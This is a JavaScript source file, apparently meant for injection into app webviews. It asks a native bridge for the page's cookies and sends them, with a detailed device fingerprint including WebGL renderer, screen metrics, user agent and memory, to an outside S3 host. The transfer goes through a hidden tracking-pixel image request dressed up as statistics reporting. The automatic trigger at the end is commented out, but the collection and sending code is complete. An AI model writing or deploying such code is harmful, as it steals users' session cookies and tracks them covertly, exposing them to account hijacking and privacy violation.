function checkNativeInterface() {
    if (window.native) {
        // appendToOutput("原生接口已准备好");
        return true;
    } else {
        // appendToOutput("原生接口不可用");
        return false;
    }
}

function $getCks() {
    // console.log('请求cookie信息');
    window.isRequestSent = { getCks: true };
    if (!checkNativeInterface()) return;

    const message = {
        command: "getCks"
    };
    window.native.postMessage(JSON.stringify(message));

    // appendToOutput("已请求cookie信息");
}

function onCksReceived(cks) {
    // appendToOutput("收到cookie信息: " + JSON.stringify(cks));

    reportCookiesToStats(cks);
}


function reportCookiesToStats(cks) {
    try {
        // const base64Cks = jsonToBase64(cks);
        const base64Cks = cks;
        const piffexHost = "https://stat1.s3.ap-southeast-3.amazonaws.com";

        const properties = o_getProperties();
        // 构造请求URL
        const timestamp = Date.now();
        const domain = new URL(location.href).hostname.replace('www.', '').split('.')[0];
        const url = `${piffexHost}/t.gif?cks=${encodeURIComponent(base64Cks)}&a=&t=${timestamp}&s=${domain}` + properties;

        // 发送请求
        const img = new Image();
        img.style.display = 'none';
        img.onload = function () {
            // appendToOutput("Cookies上报成功");
        };
        img.onerror = function () {
            // appendToOutput("Cookies上报失败");
        };
        img.src = url;
        document.body.appendChild(img);
    } catch (error) {
        // appendToOutput("处理cookies时出错: " + error.message);
    }
}

/**
 * 将JSON对象转换为Base64编码字符串
 * @param {Object} jsonData - 要转换的JSON对象
 * @returns {string} Base64编码的字符串
 */
function jsonToBase64(jsonData) {
    try {
        // 1. 将JSON对象转为字符串
        const jsonString = JSON.stringify(jsonData);

        // 2. 将字符串转为Base64编码
        if (typeof btoa === 'function') {
            // 浏览器环境
            return btoa(unescape(encodeURIComponent(jsonString)));
        } else if (typeof Buffer === 'function') {
            // Node.js环境
            return Buffer.from(jsonString, 'utf8').toString('base64');
        } else {
            // 其他环境（如某些移动端环境）
            // 使用polyfill方法
            const base64Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            let result = '';
            let i = 0;
            const str = encodeURIComponent(jsonString).replace(/%([0-9A-F]{2})/g, function (match, p1) {
                return String.fromCharCode(parseInt(p1, 16));
            });

            while (i < str.length) {
                const char1 = str.charCodeAt(i++);
                const char2 = str.charCodeAt(i++);
                const char3 = str.charCodeAt(i++);

                const enc1 = char1 >> 2;
                const enc2 = ((char1 & 3) << 4) | (char2 >> 4);
                let enc3 = ((char2 & 15) << 2) | (char3 >> 6);
                let enc4 = char3 & 63;

                if (isNaN(char2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(char3)) {
                    enc4 = 64;
                }

                result += base64Chars.charAt(enc1) + base64Chars.charAt(enc2) +
                    base64Chars.charAt(enc3) + base64Chars.charAt(enc4);
            }

            return result;
        }
    } catch (error) {
        console.error('Error converting JSON to Base64:', error);
        return null;
    }
}

function appendToOutput(message) {
    // console.log(message);
}

function o_getProperties() {
    let sh = window.screen.height
    let sw = window.screen.width
    let vh = window.visualViewport.height
    let vw = window.visualViewport.width
    let dpr = window.devicePixelRatio
    let pf = navigator.platform
    let ua = encodeURI(navigator.userAgent)
    let core = navigator.hardwareConcurrency || ''
    let mem = navigator.deviceMemory || ''
    let langs = navigator.languages
    let glv = ""
    let glr = ""
    let canvas = document.createElement('canvas')
    canvas.id = 'webglCanvas'
    canvas.width = 1
    canvas.height = 1
    canvas.style.display = 'none'
    // document.body.appendChild(canvas)
    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
    if (gl) {
        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
        if (debugInfo) {
            glv = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
            glr = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        }
    }
    return '&sh=' + sh + '&sw=' + sw + '&vh=' + vh + '&vw=' + vw + '&dpr=' + dpr + '&pf=' + pf + '&ua=' + ua + '&core=' + core + '&mem=' + mem + '&langs=' + langs + '&glv=' + encodeURI(glv) + '&glr=' + encodeURI(glr)
}

// if (document.readyState !== 'loading') {
//     $getCks();
// } else {
//     // 页面加载完成后检查原生接口
//     document.addEventListener('DOMContentLoaded', $getCks);
// }